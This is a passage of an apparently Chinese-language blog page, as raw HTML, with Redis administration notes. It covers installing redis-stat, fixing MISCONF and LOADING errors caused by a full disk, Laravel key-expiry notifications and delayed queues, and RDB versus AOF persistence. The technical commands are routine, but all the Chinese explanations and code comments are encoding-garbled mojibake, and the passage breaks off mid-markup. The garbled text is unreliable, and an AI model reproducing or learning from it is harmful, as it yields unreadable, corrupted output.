class="comment">//github.com/junegunn/redis-stat</span></span><br><span class="line">yum install ruby ruby-devel rubygem</span><br><span class="line">#æ›´æ¢gemæºï¼Œä½¿ç”¨å›½å†…é•œåƒæºä¸‹è½½æ›´å¿«</span><br><span class="line">gem source -a https:<span class="comment">//ruby.taobao.org/ #æ·»åŠ æ·˜å®æº</span></span><br><span class="line">gem source -r http:<span class="comment">//rubygems.org/ #åˆ é™¤å¢ƒå¤–æº</span></span><br><span class="line"></span><br><span class="line">[root@localhost ~]# gem install redis --version 3.0.0 #é»˜è®¤æœ€æ–°æ˜¯4.0ç‰ˆæœ¬</span><br><span class="line">Fetching: redis<span class="number">-3.0</span><span class="number">.0</span>.gem (<span class="number">100</span>%)</span><br><span class="line">[root@localhost ~]# gem install redis-stat</span><br><span class="line">Fetching: ansi256<span class="number">-0.2</span><span class="number">.5</span>.gem (<span class="number">100</span>%)</span><br><span class="line">Successfully installed ansi256<span class="number">-0.2</span><span class="number">.5</span></span><br><span class="line">ä½¿ç”¨redis-stat å‘½ä»¤è¡Œå½¢å¼</span><br><span class="line">[root@localhost ~]# redis-stat 127.0.0.1:6379</span><br><span class="line">/usr/local/rvm/gems/ruby<span class="number">-2.4</span><span class="number">.1</span>/gems/sinatra<span class="number">-1.3</span><span class="number">.6</span>/lib/sinatra/base.rb:<span class="number">1070</span>: warning: constant ::Fixnum is deprecated</span><br><span class="line">ä½¿ç”¨redis-stat webserverå½¢å¼</span><br><span class="line">[root@localhost ~]# redis-stat 127.0.0.1:6379 --server=6666 --daemon #ç«¯å£è‡ªå®šä¹‰</span><br><span class="line">/usr/local/rvm/gems/ruby<span class="number">-2.4</span><span class="number">.1</span>/gems/sinatra<span class="number">-1.3</span><span class="number">.6</span>/lib/sinatra/base.rb:<span class="number">1070</span>: warning: constant ::Fixnum is deprecated</span><br><span class="line"></span><br><span class="line">æ‰“å¼€http:<span class="comment">//æœåŠ¡å™¨ipåœ°å€:8000 è®¿é—®</span></span><br><span class="line"></span><br><span class="line">é›†ç¾¤ä¹Ÿæ˜¯ä¸€æ ·çš„</span><br><span class="line">redis-stat <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7000</span> <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7001</span> <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7002</span> <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7003</span> <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7004</span> <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7005</span> --</span><br><span class="line">https:<span class="comment">//me.jinchuang.org/archives/233.html</span></span><br></pre></td></tr></table></figure>
<h3 id="loading-redis-is-loading-the-dataset-in-memory-laravel"><a href="#loading-redis-is-loading-the-dataset-in-memory-laravel" class="headerlink" title="loading redis is loading the dataset in memory laravel"></a>loading redis is loading the dataset in memory laravel</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# redis-cli</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; ping</span><br><span class="line">(error) MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk. Commands that may modify the data set are disabled. Please check Redis logs <span class="keyword">for</span> details about the error.</span><br><span class="line"></span><br><span class="line">ps aux|grep redis|grep -v grep|awk <span class="string">'&#123;print $2&#125;'</span>|xargs kill <span class="number">-9</span></span><br><span class="line">redis-server /etc/redis.conf</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>[<span class="number">1</span>]&gt; ping</span><br><span class="line">(error) LOADING Redis is loading the dataset <span class="keyword">in</span> memory</span><br><span class="line"></span><br><span class="line">echo <span class="string">'vm.overcommit_memory = 1'</span> &gt;&gt; <span class="regexp">/etc/</span>sysctl.conf</span><br><span class="line">sysctl vm.overcommit_memory=<span class="number">1</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; ping</span><br><span class="line">PONG</span><br><span class="line">ä½†æ˜¯å†™ä¸è¿›Redis </span><br><span class="line"></span><br><span class="line">Redisè¢«é…ç½®ä¸ºä¿å­˜æ•°æ®åº“å¿«ç…§ï¼Œä½†å®ƒç›®å‰ä¸èƒ½æŒä¹…åŒ–åˆ°ç¡¬ç›˜ã€‚ç”¨æ¥ä¿®æ”¹é›†åˆæ•°æ®çš„å‘½ä»¤ä¸èƒ½ç”¨ã€‚è¯·æŸ¥çœ‹Redisæ—¥å¿—çš„è¯¦ç»†é”™è¯¯ä¿¡æ¯ã€‚</span><br><span class="line"></span><br><span class="line">åŸå› </span><br><span class="line">å¼ºåˆ¶å…³é—­Rediså¿«ç…§å¯¼è‡´ä¸èƒ½æŒä¹…åŒ–ã€‚</span><br><span class="line"></span><br><span class="line">è§£å†³æ–¹æ¡ˆ</span><br><span class="line">å°†stop-writes-on-bgsave-errorè®¾ç½®ä¸ºno</span><br><span class="line"></span><br><span class="line">âœ  sh redis-cli -h <span class="number">172.16</span><span class="number">.200</span>.xx -p <span class="number">6378</span></span><br><span class="line"><span class="number">172.16</span><span class="number">.200</span>.xx:<span class="number">6378</span>&gt; config set stop-writes-on-bgsave-error no</span><br><span class="line">æ‰¾åˆ°è¿ç»´æ’æŸ¥æœºå™¨ç¡¬ç›˜å†…å­˜æ˜¯å¦æ»¡äº†ï¼Œæœç„¶ï¼Œè¿˜çœŸæ˜¯ç¡¬ç›˜å†…å­˜æ»¡äº†ï¼Œå¯¼è‡´æŒä¹…åŒ–ä¿å­˜å¿«ç…§æ—¶ï¼Œå‘ç”Ÿå¼‚å¸¸ã€‚</span><br><span class="line">[root@localhost ~]# df -h</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/sda2       <span class="number">4.0</span>G  <span class="number">2.1</span>G  <span class="number">1.8</span>G  <span class="number">55</span>% <span class="regexp">/</span></span><br><span class="line"><span class="regexp">tmpfs           5.9G     0  5.9G   0% /</span>dev/shm</span><br><span class="line">/dev/sda7        <span class="number">96</span>G   <span class="number">11</span>G   <span class="number">80</span>G  <span class="number">12</span>% <span class="regexp">/data0</span></span><br><span class="line"><span class="regexp">/</span>dev/sda5       <span class="number">7.9</span>G  <span class="number">278</span>M  <span class="number">7.3</span>G   <span class="number">4</span>% <span class="regexp">/tmp</span></span><br><span class="line"><span class="regexp">/</span>dev/sda3        <span class="number">12</span>G  <span class="number">8.8</span>G  <span class="number">2.5</span>G  <span class="number">79</span>% <span class="regexp">/usr</span></span><br><span class="line"><span class="regexp">/</span>dev/sda6       <span class="number">7.9</span>G  <span class="number">7.8</span>G     <span class="number">0</span> <span class="number">100</span>% <span class="regexp">/var</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">127.0.0.1:6379&gt; config get dir</span></span><br><span class="line"><span class="regexp">1) "dir"</span></span><br><span class="line"><span class="regexp">2) "/</span><span class="keyword">var</span>/lib/redis<span class="string">"</span></span><br><span class="line"><span class="string">127.0.0.1:6379&gt; config get dbfilename</span></span><br><span class="line"><span class="string">1) "</span>dbfilename<span class="string">"</span></span><br><span class="line"><span class="string">2) "</span>dump.rdb<span class="string">"</span></span><br><span class="line"><span class="string">æŒä¹…åŒ–æ–‡ä»¶/varlib/redis/dump.rdb æ»¡äº† å†™ä¸è¿›å»äº† </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://stackoverflow.com/questions/19581059/misconf-redis-is-configured-to-save-rdb-snapshots</span></span><br><span class="line"><span class="string">http://ju.outofmemory.cn/entry/197760</span></span><br></pre></td></tr></table></figure>
<h3 id="æå‰10åˆ†é’Ÿæé†’ä¿¡æ¯"><a href="#æå‰10åˆ†é’Ÿæé†’ä¿¡æ¯" class="headerlink" title="æå‰10åˆ†é’Ÿæé†’ä¿¡æ¯"></a>æå‰10åˆ†é’Ÿæé†’ä¿¡æ¯</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>ä¿®æ”¹redisé…ç½®æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">notify-keyspace-events <span class="string">"Ex"</span></span><br><span class="line"><span class="number">2.</span>ä¿®æ”¹datebaseé…ç½®æ–‡ä»¶</span><br><span class="line"></span><br><span class="line"> <span class="string">'notify_cache'</span> =&gt; [</span><br><span class="line">            <span class="string">'host'</span> =&gt; env(<span class="string">'REDIS_HOST'</span>, <span class="string">'127.0.0.1'</span>),</span><br><span class="line">            <span class="string">'password'</span> =&gt; env(<span class="string">'REDIS_PASSWORD'</span>, <span class="literal">null</span>),</span><br><span class="line">            <span class="string">'port'</span> =&gt; env(<span class="string">'REDIS_PORT'</span>, <span class="number">6379</span>),</span><br><span class="line">            <span class="string">'database'</span> =&gt; env(<span class="string">'REDIS_DB'</span>, <span class="number">4</span>),</span><br><span class="line">            <span class="string">'read_write_timeout'</span> =&gt; <span class="number">-1</span>,  <span class="comment">// è¯»å†™è¶…æ—¶è®¾å®š</span></span><br><span class="line">        ],</span><br><span class="line"><span class="number">3.</span>åˆ›å»ºè¿‡æœŸkey</span><br><span class="line"></span><br><span class="line">$ttl = strtotime($data[<span class="string">'return_time'</span>]) - time() - <span class="number">600</span>;</span><br><span class="line">$redis = Redis::connection(<span class="string">'notify_cache'</span>);</span><br><span class="line">$redis-&gt;set(<span class="string">'NOTIFY_CONFIRM:'</span>.$id,$id);</span><br><span class="line">$redis-&gt;expire(<span class="string">'NOTIFY_CONFIRM:'</span>.$id,$ttl);</span><br><span class="line"><span class="number">4.</span>åˆ›å»ºç›‘å¬é˜Ÿåˆ—</span><br><span class="line"></span><br><span class="line">$cache_db = config(<span class="string">'database.redis.notify_cache.database'</span>,<span class="number">4</span>);</span><br><span class="line">$pattern = <span class="string">'__keyevent@'</span>.$cache_db.<span class="string">'__:expired'</span>;</span><br><span class="line">Redis::connection(<span class="string">'notify_cache'</span>)-&gt;subscribe($pattern,<span class="function"><span class="keyword">function</span> (<span class="params">$channel</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// è®¢é˜…é”®è¿‡æœŸäº‹ä»¶</span></span><br><span class="line">    Log::info(<span class="string">'-----notify-----'</span>.$channel);</span><br><span class="line">    $key_type = str_before($channel,<span class="string">':'</span>);</span><br><span class="line">    <span class="keyword">switch</span> ($key_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'NOTIFY_CONFIRM'</span>:</span><br><span class="line">            $id = str_after($channel,<span class="string">':'</span>);    <span class="comment">// å–å‡ºå­¦å‘˜ID</span></span><br><span class="line">            $client  = Client::find($id);</span><br><span class="line">            <span class="keyword">if</span> ($client) &#123;</span><br><span class="line">                  <span class="comment">//ä¸šåŠ¡é€»è¾‘</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">åŠ å…¥é˜Ÿåˆ—https:<span class="comment">//learnku.com/articles/34526</span></span><br><span class="line"><span class="keyword">const</span> LISTEN_REDIS_NAME = <span class="string">'eeop:axb:bind_log'</span>;<span class="comment">//å®šæ—¶è§£ç»‘åšåˆ¤æ–­å¤„ç†</span></span><br><span class="line"><span class="keyword">const</span> AUTO_TIMEOUT = <span class="number">60</span>;<span class="comment">//è‡ªåŠ¨è§£ç»‘60s</span></span><br><span class="line"><span class="comment">//åŠ å…¥é˜Ÿåˆ— æœ‰åºé˜Ÿåˆ—</span></span><br><span class="line">$<span class="keyword">this</span>-&gt;redis::zadd(self::LISTEN_REDIS_NAME, time() + self::AUTO_TIMEOUT, $<span class="keyword">this</span>-&gt;bind_id);</span><br><span class="line"><span class="number">2.</span> è§£ç»‘æœåŠ¡</span><br><span class="line"></span><br><span class="line">$list = $<span class="keyword">this</span>-&gt;redis::ZRANGEBYSCORE(self::LISTEN_REDIS_NAME,<span class="number">0</span>,time());</span><br><span class="line">foreach ($list <span class="keyword">as</span> $value)&#123;</span><br><span class="line">    $<span class="keyword">this</span>-&gt;redis::zrem(self::LISTEN_REDIS_NAME, $value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//www.jianshu.com/p/588891acd44c</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-æŒä¹…åŒ–å­˜å‚¨"><a href="#Redis-æŒä¹…åŒ–å­˜å‚¨" class="headerlink" title="Redis æŒä¹…åŒ–å­˜å‚¨"></a>Redis æŒä¹…åŒ–å­˜å‚¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">ä¸€ç§æ˜¯ aof æ—¥å¿—è¿½åŠ çš„æ–¹å¼ï¼Œå¦å¤–ä¸€ç§æ˜¯ rdb æ•°æ®å¿«ç…§çš„æ–¹å¼ã€‚</span><br><span class="line">RDB æŒä¹…åŒ–å­˜å‚¨å³æ˜¯å°† redis å­˜åœ¨å†…å­˜ä¸­çš„æ•°æ®ä»¥å¿«ç…§çš„å½¢å¼ä¿å­˜åœ¨æœ¬åœ°ç£ç›˜ä¸­ã€‚</span><br><span class="line"></span><br><span class="line">æ‰‹åŠ¨å¤‡ä»½é€šè¿‡ save å‘½ä»¤å’Œ bgsave å‘½ä»¤ã€‚save æ˜¯åŒæ­¥é˜»å¡ï¼Œè€Œ bgsave æ˜¯éé˜»å¡ (é˜»å¡å®é™…å‘ç”Ÿåœ¨ fork çš„å­è¿›ç¨‹ä¸­)ã€‚å› æ­¤ï¼Œåœ¨æˆ‘ä»¬å®é™…è¿‡ç¨‹ä¸­å¤§å¤šæ˜¯ä½¿ç”¨ bgsave å‘½ä»¤å®ç°å¤‡ä»½.</span><br><span class="line">è‡ªåŠ¨å¤‡ä»½</span><br><span class="line"></span><br><span class="line">a. ä¿®æ”¹é…ç½®é¡¹ save m n å³è¡¨ç¤ºåœ¨ m ç§’å†…æ‰§è¡Œäº† n æ¬¡å‘½ä»¤åˆ™è¿›è¡Œå¤‡ä»½.</span><br><span class="line"></span><br><span class="line">b. å½“ Redis ä»æœåŠ¡å™¨é¡¹ä¸»æœåŠ¡å™¨å‘é€å¤åˆ¶è¯·æ±‚æ—¶ï¼Œä¸»æœåŠ¡å™¨åˆ™ä¼šä½¿ç”¨ bgsave å‘½ä»¤ç”Ÿæˆ rbd æ–‡ä»¶ï¼Œç„¶åä¼ è¾“ç»™ä»æœåŠ¡å™¨.</span><br><span class="line"></span><br><span class="line">c. å½“æ‰§è¡Œ debug reload å‘½ä»¤æ—¶ä¹Ÿä¼šä½¿ç”¨ save å‘½ä»¤ç”Ÿæˆ rdb æ–‡ä»¶.</span><br><span class="line"></span><br><span class="line">d. å½“ä½¿ç”¨ shutdown å‘½ä»¤å…³æ‰æœåŠ¡æ—¶ï¼Œå¦‚æœæ²¡æœ‰å¯ç”¨ aof æ–¹å¼å®ç°æŒä¹…åŒ–åˆ™ä¼šé‡‡ç”¨ bgsave çš„æ–¹å¼åšæŒä¹…åŒ–ã€‚åŒæ—¶ shutdown åé¢å¯ä»¥åŠ å¤‡ä»½å‚æ•° [nosave|save].</span><br><span class="line"></span><br><span class="line">ä¼˜åŠ¿:</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> æ–‡ä»¶å®ç°çš„æ•°æ®å¿«ç…§ï¼Œå…¨é‡å¤‡ä»½ï¼Œä¾¿äºæ•°æ®çš„ä¼ è¾“ã€‚æ¯”å¦‚æˆ‘ä»¬éœ€è¦æŠŠ A æœåŠ¡å™¨ä¸Šçš„å¤‡ä»½æ–‡ä»¶ä¼ è¾“åˆ° B æœåŠ¡å™¨ä¸Šé¢ï¼Œç›´æ¥å°† rdb æ–‡ä»¶æ‹·è´å³å¯.</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> æ–‡ä»¶é‡‡ç”¨å‹ç¼©çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå½“é‡å¯æœåŠ¡æ—¶åŠ è½½æ•°æ®æ–‡ä»¶ï¼Œæ¯” aof æ–¹å¼æ›´å¿«.</span><br><span class="line"></span><br><span class="line">åŠ£åŠ¿:</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>rbd é‡‡ç”¨åŠ å¯†çš„äºŒè¿›åˆ¶æ ¼å¼å­˜å‚¨æ–‡ä»¶ï¼Œç”±äº Redis å„ä¸ªç‰ˆæœ¬ä¹‹é—´çš„å…¼å®¹æ€§é—®é¢˜ä¹Ÿå¯¼è‡´ rdb ç”±ç‰ˆæœ¬å…¼å®¹é—®é¢˜å¯¼è‡´æ— æ³•å†å…¶ä»–çš„ Redis ç‰ˆæœ¬ä¸­ä½¿ç”¨.</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> æ—¶æ•ˆæ€§å·®ï¼Œå®¹æ˜“é€ æˆæ•°æ®çš„ä¸å®Œæ•´æ€§ã€‚å› ä¸º rdb å¹¶ä¸æ˜¯å®æ—¶å¤‡ä»½ï¼Œå½“æŸä¸ªæ—¶é—´æ®µ Redis æœåŠ¡å‡ºç°å¼‚å¸¸ï¼Œå†…å­˜æ•°æ®ä¸¢å¤±ï¼Œè¿™æ®µæ—¶é—´çš„æ•°æ®æ˜¯æ— æ³•æ¢å¤çš„ï¼Œå› æ­¤æ˜“å¯¼è‡´æ•°æ®çš„ä¸¢å¤±.</span><br><span class="line">å½“é‡åˆ°ç£ç›˜å†™æ»¡æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¥åˆ‡æ¢å­˜å‚¨ç£ç›˜</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// dirNameåˆ™æ˜¯æ–°çš„å­˜å‚¨ç›®å½•å(è¯¥æ–¹å¼åŒæ ·é€‚ç”¨äºaofæ ¼å¼)</span></span><br><span class="line"></span><br><span class="line">config set dir dirName</span><br><span class="line">AOF æŒä¹…åŒ–å­˜å‚¨æ˜¯ä»€ä¹ˆ</span><br><span class="line"></span><br><span class="line">å½• redis çš„æ“ä½œæ—¥å¿—ï¼Œå°† redis æ‰§è¡Œè¿‡çš„å‘½ä»¤è®°å½•ä¸‹è½½ï¼Œå½“æˆ‘ä»¬éœ€è¦æ•°æ®æ¢å¤æ—¶ï¼Œredis å»é‡æ–°æ‰§è¡Œä¸€æ¬¡æ—¥å¿—æ–‡ä»¶ä¸­çš„å‘½ä»¤</span><br><span class="line"><span class="comment">// å°†noæ”¹ä¸ºyesï¼Œæ§åˆ¶aofå¼€å¯ä¸å¦</span></span><br><span class="line"></span><br><span class="line">appendonly no</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ§åˆ¶aofæ–‡ä»¶åç§°ï¼Œå­˜å‚¨çš„ç›®å½•ä¾¿æ˜¯diré…ç½®é¡¹</span></span><br><span class="line"></span><br><span class="line">appendfilename <span class="string">"appendonly.aof"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸‰ç§å¤‡ä»½ç­–ç•¥(ä¸‰è€…åªéœ€è¦å¼€å¯ä»¥ä¸€ä¸ªå³å¯)</span></span><br><span class="line"></span><br><span class="line"># appendfsync always // å‘½ä»¤å†™å…¥ç«‹å³å†™å…¥ç£ç›˜</span><br><span class="line"></span><br><span class="line">appendfsync everysec <span class="comment">// æ¯ç§’å®ç°æ–‡ä»¶çš„åŒæ­¥ï¼Œå†™å…¥ç£ç›˜</span></span><br><span class="line"></span><br><span class="line"># appendfsync no // éšæœºè¿›è¡Œæ–‡ä»¶çš„åŒæ­¥,åŒæ­¥æ“ä½œåˆ™äº¤ç»™æ“ä½œç³»ç»Ÿæ¥è´Ÿè´£ï¼Œé€šå¸¸æ—¶é—´æ˜¯æœ€é•¿30s</span><br><span class="line"></span><br><span class="line">ä¼˜ç‚¹:</span><br><span class="line"></span><br><span class="line">å¤šç§æ–‡ä»¶å†™å…¥ (fsync) ç­–ç•¥.</span><br><span class="line"></span><br><span class="line">æ•°æ®å®æ—¶ä¿å­˜ï¼Œæ•°æ®å®Œæ•´æ€§å¼ºã€‚å³ä½¿ä¸¢å¤±æŸäº›æ•°æ®ï¼Œåˆ¶å®šå¥½ç­–ç•¥æœ€å¤šä¹Ÿæ˜¯ä¸€ç§’å†…çš„æ•°æ®ä¸¢å¤±.</span><br><span class="line"></span><br><span class="line">å¯è¯»æ€§å¼ºï¼Œç”±äºä½¿ç”¨çš„æ˜¯æ–‡æœ¬åè®®æ ¼å¼æ¥å­˜å‚¨çš„æ•°æ®ï¼Œå¯æœ‰ç›´æ¥æŸ¥çœ‹æ“ä½œçš„å‘½ä»¤ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥æ‰‹åŠ¨æ”¹å†™å‘½ä»¤.</span><br><span class="line"></span><br><span class="line">ç¼ºç‚¹:</span><br><span class="line"></span><br><span class="line">æ–‡ä»¶ä½“ç§¯è¿‡å¤§ï¼ŒåŠ è½½é€Ÿåº¦æ¯” rbd æ…¢ã€‚ç”±äº aof è®°å½•çš„æ˜¯ redis æ“ä½œçš„æ—¥å¿—ï¼Œä¸€äº›æ— æ•ˆçš„ï¼Œå¯ç®€åŒ–çš„æ“ä½œä¹Ÿä¼šè¢«è®°å½•ä¸‹æ¥ï¼Œé€ æˆ aof æ–‡ä»¶è¿‡å¤§ã€‚ä½†è¯¥æ–¹å¼å¯ä»¥é€šè¿‡æ–‡ä»¶é‡å†™ç­–ç•¥è¿›è¡Œä¼˜åŒ–.</span><br><span class="line"></span><br><span class="line">é€‰æ‹© AOF è¿˜æ˜¯ RDB è¿›è¡Œæ•°æ®çš„æŒä¹…åŒ–</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> é’ˆå¯¹ä¸åŒçš„æƒ…å†µæ¥é€‰æ‹©ï¼Œå»ºè®®ä½¿ç”¨ä¸¤ç§æ–¹å¼ç›¸ç»“åˆ.</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> é’ˆå¯¹æ•°æ®å®‰å…¨æ€§ã€å®Œæ•´æ€§è¦æ±‚é«˜çš„é‡‡ç”¨ aof æ–¹å¼.</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> é’ˆå¯¹ä¸å¤ªé‡è¦çš„æ•°æ®å¯ä»¥ä½¿ç”¨ rdb æ–¹å¼.</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> å¯¹äºæ•°æ®è¿›è¡Œå…¨é‡å¤‡ä»½ï¼Œä¾¿äºæ•°æ®å¤‡ä»½çš„å¯ä»¥é‡‡ç”¨ rdb æ–¹å¼.  https:<span class="comment">//learnku.com/articles/33954</span></span><br></pre></td></tr></table></figure>
<h3 id="æ–‡ç« æŠ•ç¥¨"><a href="#æ–‡ç« æŠ•ç¥¨" class="headerlink" title="æ–‡ç« æŠ•ç¥¨"></a>æ–‡ç« æŠ•ç¥¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span 